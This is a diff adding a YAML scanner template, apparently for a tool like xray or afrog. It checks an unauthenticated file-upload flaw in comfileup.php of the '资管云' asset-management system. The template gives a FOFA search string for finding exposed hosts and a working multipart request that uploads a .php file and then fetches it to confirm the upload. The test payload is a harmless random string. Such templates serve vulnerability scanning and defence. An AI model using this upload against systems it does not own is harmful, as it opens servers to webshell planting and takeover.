@@ -1,0 +1,41 @@
+id: ziguanyun-comfileup-fileupload
+info:
+  name: 资管云comfileup.php前台文件上传漏洞
+  author: avic123
+  severity: critical
+  verified: true
+  description: |
+    百易云资产管理运营系统 comfileup.php 接口存在文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
+    fofa：body="不要着急，点此" || title="资管云"
+  reference:
+    - https://cn-sec.com/archives/3017622.html
+  tags: ziguanyun,fileupload
+  created: 2025/03/13
+
+set:
+  hostname: request.url.host
+  randstr: randomLowercase(8)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /comfileup.php
+      headers:
+        Content-Type: multipart/form-data; boundary=--------{{rboundary}}
+      body: |
+        ----------{{rboundary}}
+        Content-Disposition: form-data; name="file";filename="{{randstr}}.php"
+
+        {{randstr}}
+        ----------{{rboundary}}--
+    expression: response.status == 200 &&  response.body.bcontains(b'"vpath":')
+    output:
+      search: '"\"vpath\":\"(?P<vpath>.*?)\"".bsubmatch(response.body)'
+      vpath: replaceAll(search["vpath"], "\\", "")
+  r1:
+    request:
+      method: GET
+      path: /{{vpath}}
+    expression: response.status == 200 && response.body.bcontains(bytes(randstr))
+expression: r0() && r1()
